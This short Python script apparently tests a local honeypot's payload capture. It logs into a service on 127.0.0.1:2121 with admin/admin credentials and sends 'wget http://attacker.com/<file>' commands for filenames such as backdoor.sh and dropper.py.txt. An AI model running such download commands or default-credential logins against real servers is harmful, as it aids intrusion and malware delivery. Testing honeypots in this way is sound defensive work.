import asyncio

async def upload_payload(filename):
    try:
        reader, writer = await asyncio.open_connection('127.0.0.1', 2121)
        await reader.read(1024)
        writer.write(b"USER admin\r\n")
        await writer.drain()
        await reader.read(1024)
        writer.write(b"PASS admin\r\n")
        await writer.drain()
        await reader.read(1024)
        
        # Simulate a command that triggers the analyst (wget/curl)
        url = f"http://attacker.com/{filename}"
        writer.write(f"wget {url}\r\n".encode())
        await writer.drain()
        await reader.read(1024)
        
        writer.write(b"QUIT\r\n")
        await writer.drain()
        writer.close()
        await writer.wait_closed()
        return True
    except:
        return False

async def main():
    payloads = ["backdoor.sh", "payload.bin", "config.xml", "dropper.py.txt", "hidden_malware"]
    print(f"Testing Payload Capture Rate for {len(payloads)} high-risk files...")
    
    for p in payloads:
        print(f"  Uploading {p}...")
        await upload_payload(p)
        await asyncio.sleep(0.5)
        
    print("\nCAPTURE AUDIT COMPLETE.")

if __name__ == "__main__":
    asyncio.run(main())
